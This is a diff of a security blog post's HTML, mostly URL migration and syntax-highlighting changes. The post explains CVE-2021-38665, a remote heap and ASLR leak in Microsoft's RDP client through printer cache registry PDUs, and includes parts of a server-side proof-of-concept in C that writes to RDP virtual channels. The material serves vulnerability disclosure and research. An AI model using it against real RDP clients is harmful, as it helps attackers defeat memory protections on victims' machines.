@@ -7,16 +7,15 @@
 <meta name="description" content="Thalium blog." />
 <meta name="keywords" content="blog, tech" />
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="generator" content="Hugo 0.95.0" />
+<meta name="generator" content="Hugo 0.108.0">
 
-<link rel="canonical" href="https://thalium.github.io/blog/posts/leaking-aslr-through-rdp-printer-cache-registry/">
+<link rel="canonical" href="https://blog.thalium.re/posts/leaking-aslr-through-rdp-printer-cache-registry/">
 <meta property="og:title" content="Remote ASLR Leak in Microsoft&#39;s RDP Client through Printer Cache Registry (CVE-2021-38665)" />
 <meta property="og:description" content="This is the second installment in my three-part series of articles on fuzzing Microsoft&rsquo;s RDP client. I will explain a bug I found by fuzzing the printer sub-protocol, and how I exploited it." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://thalium.github.io/blog/posts/leaking-aslr-through-rdp-printer-cache-registry/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://blog.thalium.re/posts/leaking-aslr-through-rdp-printer-cache-registry/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-12-10T06:00:00+01:00" />
 <meta property="article:modified_time" content="2021-12-10T06:00:00+01:00" />
-
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Remote ASLR Leak in Microsoft&#39;s RDP Client through Printer Cache Registry (CVE-2021-38665)"/>
@@ -26,16 +25,16 @@
 <meta itemprop="name" content="Remote ASLR Leak in Microsoft&#39;s RDP Client through Printer Cache Registry (CVE-2021-38665)">
 <meta itemprop="description" content="This is the second installment in my three-part series of articles on fuzzing Microsoft&rsquo;s RDP client. I will explain a bug I found by fuzzing the printer sub-protocol, and how I exploited it."><meta itemprop="datePublished" content="2021-12-10T06:00:00+01:00" />
 <meta itemprop="dateModified" content="2021-12-10T06:00:00+01:00" />
-<meta itemprop="wordCount" content="3605">
+<meta itemprop="wordCount" content="3611">
 <meta itemprop="keywords" content="RDP,Exploit,CVE,Vulnerability Research,ASLR," />
 
-<link rel="stylesheet" href="https://thalium.github.io/blog/css/layout.css" />
+<link rel="stylesheet" href="https://blog.thalium.re/css/layout.css" />
 
 
-<link rel="stylesheet" href="https://thalium.github.io/blog/css/default-dark.css" />
+<link rel="stylesheet" href="https://blog.thalium.re/css/default-dark.css" />
 
 
-<link rel="icon" href="https://thalium.github.io/blog/favicon.ico" />
+<link rel="icon" href="https://blog.thalium.re/favicon.ico" />
 
 
 <script type="application/javascript">
@@ -106,19 +105,19 @@ if (!doNotTrack) {
 
   <nav>
     <div class="siteTitle">
-      <a href="https://thalium.github.io/blog/">
-        <img src="https://thalium.github.io/blog/shard_only_no_background.png" width=12%></img>
+      <a href="https://blog.thalium.re/">
+        <img src="https://blog.thalium.re/shard_only_no_background.png" width=12%></img>
         <span>THALIUM</span>
       </a>
     </div> 
 
     
     
-    <a class="nav-item" href="https://thalium.github.io/blog/posts/"><div class="nav-item-title">Posts</div></a>
+    <a class="nav-item" href="https://blog.thalium.re/posts/"><div class="nav-item-title">Posts</div></a>
     
-    <a class="nav-item" href="https://thalium.github.io/blog/joinus/"><div class="nav-item-title">Join Us</div></a>
+    <a class="nav-item" href="https://blog.thalium.re/joinus/"><div class="nav-item-title">Join Us</div></a>
     
-    <a class="nav-item" href="https://thalium.github.io/blog/about/"><div class="nav-item-title">About</div></a>
+    <a class="nav-item" href="https://blog.thalium.re/about/"><div class="nav-item-title">About</div></a>
     
 
   </nav>
@@ -160,9 +159,9 @@ if (!doNotTrack) {
 </ul>
 <p>Other articles in this series:</p>
 <ul>
-<li><a href="https://thalium.github.io/blog/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/">Fuzzing Microsoft&rsquo;s RDP Client using Virtual Channels: Overview &amp; Methodology</a></li>
-<li><a href="https://thalium.github.io/blog/posts/leaking-aslr-through-rdp-printer-cache-registry/">Remote ASLR Leak in Microsoft&rsquo;s RDP Client through Printer Cache Registry (CVE-2021-38665)</a></li>
-<li><a href="https://thalium.github.io/blog/posts/deserialization-bug-through-rdp-smart-card-extension/">Remote Deserialization Bug in Microsoft&rsquo;s RDP Client through Smart Card Extension (CVE-2021-38666)</a></li>
+<li><a href="https://blog.thalium.re/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/">Fuzzing Microsoft&rsquo;s RDP Client using Virtual Channels: Overview &amp; Methodology</a></li>
+<li><a href="https://blog.thalium.re/posts/leaking-aslr-through-rdp-printer-cache-registry/">Remote ASLR Leak in Microsoft&rsquo;s RDP Client through Printer Cache Registry (CVE-2021-38665)</a></li>
+<li><a href="https://blog.thalium.re/posts/deserialization-bug-through-rdp-smart-card-extension/">Remote Deserialization Bug in Microsoft&rsquo;s RDP Client through Smart Card Extension (CVE-2021-38666)</a></li>
 </ul>
 <h2 id="table-of-contents">Table of Contents</h2>
 <ul>
@@ -182,7 +181,7 @@ if (!doNotTrack) {
 <p>At Blackhat Europe 2019, a team of researchers showed they <a href="https://www.unexploitable.systems/papers/park:rdpfuzzing-slides.pdf">found an RCE</a> in the RDP client. Their motivation was that North Korean hackers would alledgely carry out attacks through RDP servers acting as proxies, and that you could hack them back by setting up a malicious RDP server to which they would connect.</p>
 <p>During my internship at Thalium, I spent time studying and reverse engineering Microsoft RDP, learning about fuzzing, and looking for vulnerabilities.</p>
 <p>In this article, I will explain how I found and exploited a vulnerability in the Microsoft RDP client that allows to leak some remote heap and break the client ASLR. It is not the most convoluted of bugs, nor the most spectacular, but I think it is kind of amusing.</p>
-<p>If you are interested in details about the <strong>Remote Desktop Protocol</strong>, <strong>reversing</strong> the Microsoft RDP client or <strong>fuzzing</strong> methodology, I invite you to read <strong><a href="https://thalium.github.io/blog/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/">my first article</a></strong> which tackles these subjects.</p>
+<p>If you are interested in details about the <strong>Remote Desktop Protocol</strong>, <strong>reversing</strong> the Microsoft RDP client or <strong>fuzzing</strong> methodology, I invite you to read <strong><a href="https://blog.thalium.re/posts/fuzzing-microsoft-rdp-client-using-virtual-channels/">my first article</a></strong> which tackles these subjects.</p>
 <p>Either way, I will briefly provide some context required to understand this article:</p>
 <ul>
 <li>The target is Microsoft&rsquo;s official RDP client on Windows 10.</li>
@@ -200,7 +199,7 @@ if (!doNotTrack) {
 <p><strong><code>RDPDR</code></strong> is the name of the static virtual channel which purpose is to <strong>redirect access from the server to the client file system</strong>. It is also the base channel that hosts several <strong>sub-extensions</strong> such as the smart card extension, the <strong>printing extension</strong> or the serial/parallel ports extension.</p>
 <p><code>RDPDR</code> is one of the few channels that are <strong>opened by default</strong> in the RDP client, alongside other static channels <code>RDPSND</code>, <code>CLIPRDR</code>, <code>DRDYNVC</code>. This makes it an even more interesting target risk-wise.</p>
 <p>Microsoft has some nice <a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPEFS/%5bMS-RDPEFS%5d.pdf">documentation</a> on this channel. It contains the different PDU types, their structures, and even dozens of examples of PDUs which is great for seeding our fuzzer.</p>
-<p>Fuzzing <code>RDPDR</code> yielded a few small bugs, as well as another bug for which I got a CVE (see my next article: <a href="https://thalium.github.io/blog/posts/deserialization-bug-through-rdp-smart-card-extension/">Remote Deserialization Bug in Microsoft&rsquo;s RDP Client through Smart Card Extension</a>).</p>
+<p>Fuzzing <code>RDPDR</code> yielded a few small bugs, as well as another bug for which I got a CVE (see my next article: <a href="https://blog.thalium.re/posts/deserialization-bug-through-rdp-smart-card-extension/">Remote Deserialization Bug in Microsoft&rsquo;s RDP Client through Smart Card Extension</a>).</p>
 <p>What&rsquo;s interesting though, is that while I found the vulnerability I am going to explain by fuzzing, the <em>crashes</em> WinAFL found were not what led me to discover this bug at all. Rather, it was the prolonged fuzzing and the millions of executions that unveiled <strong>unexpected side effects</strong> the server could have on the client&rsquo;s system.</p>
 <h1 id="strange-registry-shenanigans">Strange registry shenanigans</h1>
 <p>I was heavily fuzzing the RDPDR channel, and at some point my RDP client just broke. Not broke like in crash once and forget about it; everytime I would start the client, it would eat up a stupid amount of memory until eventually hanging the whole system. No reboot or RDP cache clear would help.</p>
@@ -208,8 +207,8 @@ if (!doNotTrack) {
 <p>This fact alone is already very annoying for a client: it is even worse than a simple crash or arbitrary memory allocation. Since the bug is persistent, it entirely prevents you from using RDP ever again, unless you <em>specifically</em> know how to fix the problem by deleting the correct keys in the registry.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/procmon-registry-garbage.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/procmon-registry-garbage.png" alt="Procmon showing garbage keys being created in the registry">
+    <a href="https://blog.thalium.re/posts/img/rdp/procmon-registry-garbage.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/procmon-registry-garbage.png" alt="Procmon showing garbage keys being created in the registry">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       Procmon showing garbage keys being created in the registry
@@ -221,8 +220,8 @@ if (!doNotTrack) {
 <p>I looked for references to registry operations in <code>mstscax.dll</code> and correlated my findings with the <a href="https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPEPC/%5BMS-RDPEPC%5D.pdf"><strong>printer subprotocol specification</strong></a>.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/dr_prn_add_cachedata.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/dr_prn_add_cachedata.png" alt="Add Printer Cachedata PDU specification">
+    <a href="https://blog.thalium.re/posts/img/rdp/dr_prn_add_cachedata.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/dr_prn_add_cachedata.png" alt="Add Printer Cachedata PDU specification">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       Add Printer Cachedata PDU structure from the specification
@@ -306,8 +305,8 @@ if (!doNotTrack) {
 <p>Upon receiving this PDU from the server on the <code>RDPDR</code> channel, the client will enter <code>W32DrPRN::ProcessPrinterCacheInfo</code> and our message be dispatched to <code>W32DrPRN::AddPrinterCacheInfo</code>.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/rdpdr_add_printer_cache_graph.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/rdpdr_add_printer_cache_graph.png" alt="Path taken by the malicious PDU">
+    <a href="https://blog.thalium.re/posts/img/rdp/rdpdr_add_printer_cache_graph.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/rdpdr_add_printer_cache_graph.png" alt="Path taken by the malicious PDU">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       Path taken by the malicious PDU in mstscax.dll
@@ -317,8 +316,8 @@ if (!doNotTrack) {
 <p>Right before the second call to <code>RegCreateKeyExW</code>, here&rsquo;s what memory at <code>PrinterName</code> can look like:</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/bug-2021-06-08-A-memory-dump.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/bug-2021-06-08-A-memory-dump.png" alt="Heap memory dump at PrinterName">
+    <a href="https://blog.thalium.re/posts/img/rdp/bug-2021-06-08-A-memory-dump.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/bug-2021-06-08-A-memory-dump.png" alt="Heap memory dump at PrinterName">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       Heap memory dump at PrinterName
@@ -329,8 +328,8 @@ if (!doNotTrack) {
 <p>We can confirm by taking a look at the registry right after this call!</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/bug-2021-06-08-A-registry-leak.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/bug-2021-06-08-A-registry-leak.png" alt="Leakage inside the registry">
+    <a href="https://blog.thalium.re/posts/img/rdp/bug-2021-06-08-A-registry-leak.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/bug-2021-06-08-A-registry-leak.png" alt="Leakage inside the registry">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       Leakage inside the registry
@@ -349,8 +348,8 @@ if (!doNotTrack) {
 <p>Providentially, the following message type exists, and the client is supposed to send it to the server upon initialization of the <code>RDPDR</code> virtual channel.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/dr_prn_device_announce.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/dr_prn_device_announce.png" alt="Client Device List Announce Request PDU specification">
+    <a href="https://blog.thalium.re/posts/img/rdp/dr_prn_device_announce.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/dr_prn_device_announce.png" alt="Client Device List Announce Request PDU specification">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       Client Device List Announce Request PDU structure from the specification
@@ -373,8 +372,8 @@ if (!doNotTrack) {
 <p>While I was fuzzing other channels, I noticed that if you sent garbage to the dynamic channel <code>Microsoft::Windows::RDS::Graphics</code> (which transports bitmap data), the client would show this pop-up window and <strong>automatically reconnect</strong>.</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/connection-lost.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/connection-lost.png" alt="The connection has been lost&amp;hellip;">
+    <a href="https://blog.thalium.re/posts/img/rdp/connection-lost.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/connection-lost.png" alt="The connection has been lost&amp;hellip;">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       The connection has been lost...
@@ -437,8 +436,8 @@ if (!doNotTrack) {
 <p>Example run on the Insider Build:</p>
 <p>
   <figure style="margin-top: 1em; margin-bottom: 1em">
-    <a href="https://thalium.github.io/blog/posts/img/rdp/bug-2021-06-08-A-aslr-leak-windows-insider.png" target="_blank">
-      <img src="https://thalium.github.io/blog/posts/img/rdp/bug-2021-06-08-A-aslr-leak-windows-insider.png" alt="Leak mstscax.dll base address in Windows Insider Build">
+    <a href="https://blog.thalium.re/posts/img/rdp/bug-2021-06-08-A-aslr-leak-windows-insider.png" target="_blank">
+      <img src="https://blog.thalium.re/posts/img/rdp/bug-2021-06-08-A-aslr-leak-windows-insider.png" alt="Leak mstscax.dll base address in Windows Insider Build">
     </a>
     <figcaption style="font-weight: normal; font-style: italic; margin-top: 1em">
       Leak mstscax.dll base address in Windows Insider Build
@@ -495,28 +494,28 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hexdump</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer, <span style="color:#66d9ef">int</span> length)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] &#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> length; i<span style="color:#f92672">++</span>)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%02x &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)buffer[i]);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%02x &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>)buffer[i]);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hook_to_rdp</span>()
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    rdp_server <span style="color:#f92672">=</span> WTSOpenServerA(<span style="color:#e6db74">&#34;localhost&#34;</span>);
+</span></span><span style="display:flex;"><span>    rdp_server <span style="color:#f92672">=</span> <span style="color:#a6e22e">WTSOpenServerA</span>(<span style="color:#e6db74">&#34;localhost&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>rdp_server)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not open RDP server handle. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Could not open RDP server handle. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Hooked to local RDP server.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Hooked to local RDP server.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">connect_to_virtual_channel</span>(<span style="color:#66d9ef">char</span> channel_name[], <span style="color:#66d9ef">int</span> n_tries, <span style="color:#66d9ef">int</span> channel_type)
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Attempting to open Virtual Channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Attempting to open Virtual Channel...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> tries <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>)
@@ -526,21 +525,21 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        virtual_channel <span style="color:#f92672">=</span> WTSVirtualChannelOpenEx(WTS_CURRENT_SESSION, channel_name, channel_type <span style="color:#f92672">==</span> DYNAMIC_CHANNEL <span style="color:#f92672">?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        virtual_channel <span style="color:#f92672">=</span> <span style="color:#a6e22e">WTSVirtualChannelOpenEx</span>(WTS_CURRENT_SESSION, channel_name, channel_type <span style="color:#f92672">==</span> DYNAMIC_CHANNEL <span style="color:#f92672">?</span> WTS_CHANNEL_OPTION_DYNAMIC : <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (virtual_channel)
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">1000</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">==</span> n_tries)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Couldn&#39;t open Virtual Channel &#39;%s&#39; in %d tries. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Couldn&#39;t open Virtual Channel &#39;%s&#39; in %d tries. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries, <span style="color:#a6e22e">GetLastError</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Opened Virtual Channel &#39;%s&#39; in %d tries.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opened Virtual Channel &#39;%s&#39; in %d tries.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, channel_name, tries);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
@@ -557,81 +556,81 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (WTSVirtualChannelWrite(virtual_channel, buffer, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)length, <span style="color:#f92672">&amp;</span>bytes_written))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">WTSVirtualChannelWrite</span>(virtual_channel, buffer, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)length, <span style="color:#f92672">&amp;</span>bytes_written))
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
 </span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">500</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">500</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tries <span style="color:#f92672">==</span> MAX_VC_WRITE_TRIES)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not write to Virtual Channel. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Could not write to Virtual Channel. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Successfully wrote %lu bytes to Virtual Channel.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bytes_written);
-</span></span><span style="display:flex;"><span>    hexdump(buffer, length);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Successfully wrote %lu bytes to Virtual Channel.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bytes_written);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hexdump</span>(buffer, length);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">close_virtual_channel</span>()
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Closing Virtual Channel.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    WTSVirtualChannelClose(virtual_channel);
-</span></span><span style="display:flex;"><span>    CloseHandle(virtual_channel);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Closing Virtual Channel.</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WTSVirtualChannelClose</span>(virtual_channel);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(virtual_channel);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">close_rdp</span>()
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Closing RDP handle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    WTSCloseServer(rdp_server);
-</span></span><span style="display:flex;"><span>    CloseHandle(rdp_server);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Closing RDP handle.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WTSCloseServer</span>(rdp_server);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(rdp_server);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">get_termservice_pid</span>()
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    DWORD bytesNeeded, servicesNum, lastError, pid;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> serviceName[<span style="color:#ae81ff">256</span>];
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    SC_HANDLE manager <span style="color:#f92672">=</span> OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
+</span></span><span style="display:flex;"><span>    SC_HANDLE manager <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenSCManager</span>(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (manager <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not open manager. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Could not open manager. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    BOOL status <span style="color:#f92672">=</span> EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
